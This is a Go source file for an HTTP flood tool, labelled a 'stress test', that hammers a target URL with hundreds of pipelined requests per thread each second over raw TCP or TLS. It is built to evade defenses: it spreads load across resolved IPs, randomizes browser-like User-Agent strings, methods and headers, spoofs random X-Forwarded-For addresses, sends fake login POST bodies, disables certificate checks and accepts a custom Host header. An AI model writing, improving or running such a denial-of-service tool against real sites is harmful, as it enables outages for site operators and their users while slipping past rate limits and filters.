package main

import (
	"bytes"
    "crypto/tls"
    "fmt"
    "math/rand"
    "net"
    "net/url"
    "os"
    "strconv"
    "strings"
    "sync"
    "time"
)

var (
    ip            string
    ips           []string // List of resolved IPs for DNS Randomization
    port          int
    path          string
    threads       int
    timer         int
    customHost    string
    httpMethods   = []string{"GET", "POST", "HEAD"} // Random HTTP methods
	languages   = []string{"en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9"}
    contentTypes = []string{
        "application/x-www-form-urlencoded",
        "application/json",
        "text/plain",
    }
)

func randomString(length int) string {
    const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    result := make([]byte, length)
    for i := range result {
        result[i] = letters[rand.Intn(len(letters))]
    }
    return string(result)
}

func resolveDNS(hostname string) {
    addrs, err := net.LookupIP(hostname)
    if err != nil {
        fmt.Println("Failed to resolve DNS:", err)
        os.Exit(1)
    }

    for _, addr := range addrs {
        if ipv4 := addr.To4(); ipv4 != nil {
            ips = append(ips, ipv4.String())
        }
    }

    if len(ips) == 0 {
        fmt.Println("No valid IP addresses resolved!")
        os.Exit(1)
    }

    fmt.Printf("Resolved IPs: %v\n", ips)
}

func getUserAgent() string {
    browserVersions := map[string]string{
        "Chrome":  fmt.Sprintf("%d.0.%d.%d", rand.Intn(43)+80, rand.Intn(9999), rand.Intn(999)),
        "Firefox": fmt.Sprintf("%d.0", rand.Intn(50)+70),
        "Safari":  fmt.Sprintf("%d.%d.%d", rand.Intn(200)+400, rand.Intn(10), rand.Intn(10)),
        "Edg":     fmt.Sprintf("%d.%d.%d", rand.Intn(50)+90, rand.Intn(9999), rand.Intn(999)),
    }

    osInfo := map[string]string{
        "Windows":   fmt.Sprintf("Windows NT %d.%d; Win64; x64", 10+rand.Intn(2), rand.Intn(3)),
        "Mac":       fmt.Sprintf("Macintosh; Intel Mac OS X 10_%d_%d", 12+rand.Intn(5), rand.Intn(5)),
        "Linux":     "X11; Linux x86_64",
        "Android":   fmt.Sprintf("Android %d", 10+rand.Intn(5)),
        "iPhone":    fmt.Sprintf("iPhone; CPU iPhone OS %d_%d like Mac OS X", 13+rand.Intn(4), rand.Intn(3)),
        "iPad":      fmt.Sprintf("iPad; CPU OS %d_%d like Mac OS X", 13+rand.Intn(4), rand.Intn(3)),
    }

    devices := []struct {
        typeName string
        models   []string
    }{
        {"Mobile", []string{"Pixel 6", "Galaxy S22", "Xiaomi 12", "iPhone15,2"}},
        {"Tablet", []string{"iPad13,4", "SM-T870", "Pixel Tablet"}},
        {"Desktop", []string{"", "", "", ""}}, // Empty for desktop
    }

    // Select random device type
    deviceType := devices[rand.Intn(len(devices))]
    model := ""
    if deviceType.typeName != "Desktop" && len(deviceType.models) > 0 {
        model = deviceType.models[rand.Intn(len(deviceType.models))] + "; "
    }

    // Select random OS
    var osKeys []string
    for k := range osInfo {
        osKeys = append(osKeys, k)
    }
    selectedOS := osKeys[rand.Intn(len(osKeys))]

    // Select random browser
    var browserKeys []string
    for k := range browserVersions {
        browserKeys = append(browserKeys, k)
    }
    selectedBrowser := browserKeys[rand.Intn(len(browserKeys))]

    return fmt.Sprintf("Mozilla/5.0 (%s%s%s) AppleWebKit/537.36 (KHTML, like Gecko) %s/%s",
        model,
        osInfo[selectedOS],
        func() string {
            if rand.Intn(2) == 0 && deviceType.typeName == "Mobile" {
                return " Mobile"
            }
            return ""
        }(),
        selectedBrowser,
        browserVersions[selectedBrowser],
    )
}

func getHeader(method string) (string, []byte) {
    var headerBuilder strings.Builder
    headerBuilder.Grow(512) // Pre-allocate buffer for typical header size

    // Host header
    hostHeader := ip
    if customHost != "" {
        hostHeader = customHost
    }

    // Write headers
    fmt.Fprintf(&headerBuilder, "%s %s HTTP/1.1\r\nHost: %s\r\n", method, path, hostHeader)
    fmt.Fprintf(&headerBuilder, "User-Agent: %s\r\n", getUserAgent())
    headerBuilder.WriteString("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n")
    headerBuilder.WriteString("Accept-Encoding: gzip, deflate, br, zstd\r\n")
    
    // Randomized headers
    fmt.Fprintf(&headerBuilder, "Accept-Language: %s\r\n", languages[rand.Intn(len(languages))])
    
    // Efficient X-Forwarded-For generation
    var ipBuilder [4]byte
    for i := range ipBuilder {
        ipBuilder[i] = byte(rand.Intn(256))
    }
    fmt.Fprintf(&headerBuilder, "X-Forwarded-For: %d.%d.%d.%d\r\n", ipBuilder[0], ipBuilder[1], ipBuilder[2], ipBuilder[3])
    
    headerBuilder.WriteString("Connection: keep-alive\r\nCache-Control: no-cache\r\n")
    fmt.Fprintf(&headerBuilder, "Referer: https://%s\r\n", hostHeader)

    var body []byte

    if method == "POST" {
        // Content-Type
        contentType := contentTypes[rand.Intn(len(contentTypes))]
        fmt.Fprintf(&headerBuilder, "Content-Type: %s\r\n", contentType)

        // Body construction
        switch contentType {
        case "application/x-www-form-urlencoded":
            data := url.Values{
                "username": {randomString(8)},
                "password": {randomString(12)},
            }
            body = []byte(data.Encode())

        case "application/json":
            var buf bytes.Buffer
            buf.WriteByte('{')
            for i := 0; i < 3; i++ {
                if i > 0 {
                    buf.WriteByte(',')
                }
                fmt.Fprintf(&buf, "\"%s\":\"%s\"", randomString(5), randomString(10))
            }
            buf.WriteByte('}')
            body = buf.Bytes()

        case "text/plain":
            body = []byte("plain_text_" + randomString(10))
        }

        // Content-Length
        fmt.Fprintf(&headerBuilder, "Content-Length: %d\r\n", len(body))
    }

    headerBuilder.WriteString("\r\n")
    return headerBuilder.String(), body
}

func worker(id int, wg *sync.WaitGroup, requestCount chan int) {
    defer wg.Done()

    tlsConfig := &tls.Config{InsecureSkipVerify: true, ServerName: ip}
    method := httpMethods[rand.Intn(len(httpMethods))] // Pick a random method per worker
    for count := range requestCount {
        for {
            randomIP := ips[rand.Intn(len(ips))] // Pick a random resolved IP
            address := fmt.Sprintf("%s:%d", randomIP, port)

            var conn net.Conn
            var err error
            if port == 443 {
                conn, err = tls.Dial("tcp", address, tlsConfig)
            } else {
                conn, err = net.Dial("tcp", address)
            }

            if err != nil {
                fmt.Printf("Worker %d: connection error: %v\n", id, err)
                time.Sleep(time.Second)
                continue
            }

            for i := 0; i < count; i++ {
                header, body := getHeader(method)
                _, err := conn.Write([]byte(header))
                if err != nil {
                    fmt.Printf("Worker %d: write error: %v\n", id, err)
                    break
                }
                if method == "POST" {
                    _, err = conn.Write(body)
                    if err != nil {
                        fmt.Printf("Worker %d: write error: %v\n", id, err)
                        break
                    }
                }
            }
            conn.Close()
            break
        }
    }
}

func main() {
    if len(os.Args) < 4 {
        fmt.Println("Usage: <URL> <THREADS> <TIMER> [CUSTOM_HOST]")
        return
    }

    parsedURL, err := url.Parse(os.Args[1])
    if err != nil {
        fmt.Println("Invalid URL:", err)
        return
    }

    ip = parsedURL.Hostname()
    if parsedURL.Port() != "" {
        port, _ = strconv.Atoi(parsedURL.Port())
    } else if parsedURL.Scheme == "https" {
        port = 443
    } else {
        port = 80
    }

    path = parsedURL.Path
    if path == "" {
        path = "/"
    }

    threads, _ = strconv.Atoi(os.Args[2])
    timer, _ = strconv.Atoi(os.Args[3])
    if len(os.Args) > 4 {
        customHost = os.Args[4]
    }

    resolveDNS(ip)

    fmt.Printf("Starting stress test on %s:%d%s with %d threads for %d seconds\n", ip, port, path, threads, timer)
    if customHost != "" {
        fmt.Printf("Using custom Host header: %s\n", customHost)
    }

    var wg sync.WaitGroup
    requestCount := make(chan int, threads)

    for i := 0; i < threads; i++ {
        wg.Add(1)
        go worker(i, &wg, requestCount)
    }

    go func() {
        ticker := time.NewTicker(1 * time.Second)
        defer ticker.Stop()

        for t := 0; t < timer; t++ {
            <-ticker.C
            for i := 0; i < threads; i++ {
                requestCount <- rand.Intn(100)+300 // 300-400 requests
            }
        }
        close(requestCount)
    }()

    wg.Wait()
    fmt.Println("Stress test completed.")
}
